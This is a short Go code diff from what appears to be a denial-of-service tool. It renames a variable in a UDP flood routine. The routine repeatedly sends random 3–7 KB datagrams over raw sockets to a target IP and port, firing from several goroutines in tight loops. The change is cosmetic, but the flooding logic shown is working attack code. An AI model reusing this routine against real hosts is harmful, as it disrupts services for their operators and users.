@@ -43,11 +43,11 @@ func UdpMethod(ctx context.Context, ipaddr string, _port string) {
 
 			rand.NewSource(time.Now().UnixNano())
 
-			packet := utils.BuildPacket(rand.Intn(3-1)+1, rand.Intn(7<<10-3<<10)+3<<10)
+			payload := utils.BuildPayload(rand.Intn(3-1)+1, rand.Intn(7<<10-3<<10)+3<<10)
 
-			go udp(net.ParseIP(ipaddr).To4(), port, packet)
-			go udp(net.ParseIP(ipaddr).To4(), port, packet)
-			go udp(net.ParseIP(ipaddr).To4(), port, packet)
+			go udp(net.ParseIP(ipaddr).To4(), port, payload)
+			go udp(net.ParseIP(ipaddr).To4(), port, payload)
+			go udp(net.ParseIP(ipaddr).To4(), port, payload)
 
 			time.Sleep(150 * time.Millisecond)
 		}
@@ -55,7 +55,7 @@ func UdpMethod(ctx context.Context, ipaddr string, _port string) {
 
 }
 
-func udp(ip net.IP, port int, packet []byte) {
+func udp(ip net.IP, port int, payload []byte) {
 	defer Catch()
 
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
@@ -74,7 +74,7 @@ func udp(ip net.IP, port int, packet []byte) {
 	}
 
 	for i := 0; i <= 20; i++ {
-		syscall.Sendto(fd, packet, 0, &addr)
+		syscall.Sendto(fd, payload, 0, &addr)
 		time.Sleep(10 * time.Millisecond)
 	}
 
